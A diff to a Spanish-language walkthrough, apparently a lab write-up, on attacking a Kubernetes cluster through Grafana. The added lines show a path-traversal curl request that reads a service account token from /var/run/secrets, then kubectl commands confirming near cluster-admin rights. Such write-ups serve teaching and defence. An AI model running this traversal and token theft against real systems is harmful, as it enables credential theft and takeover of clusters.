@@ -132,7 +132,7 @@ $ curl --path-as-is http://grafana:3000/public/plugings/logs/../../../../../../.
 
 ```
 
-El objetivo es obtener más `secrets`. Si buscamos en el pod comprometido vemos dónde pueden estar estos `secrets`, concretamente el token de acceso:
+El objetivo es obtener más `secrets`. Si buscamos en el pod comprometido vemos dónde pueden estar estos `secrets`, concretamente el token de acceso (JWT):
 
 ```console
 $ cd /var/run/secrets/kubernetes.io/serviceaccount
@@ -141,11 +141,32 @@ ca.crt   namespace   token
 $ cat token
 ey .....Xw
 ```
+Por tanto, buscamos en el pod grafana el token de acceso:
+```console
+$ curl --path-as-is http://grafana:3000/public/plugings/logs/../../../../../../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token 
 
+ey...rQ
 
-
-
+$ export TOKEN = 'ey...rQ'
 ```
+A continuación, usamos ese token para acceder a ver qué permisos tenemos con él:
+```console
+
+$ ./kubectl auth can-i --list --token=$TOKEN
+
+*.*   []     [*]       []
+...
+```
+
+Prácticamente, ya somos administradores del cluster, pues ya es posible hacer casi cualquier cosa.
+```console
+
+$ ./kubectl get pods --token=$TOKEN
+
+grafana-123445566-xxxx    1/1      Running       2      24d
+...
+```
+
 
 
 
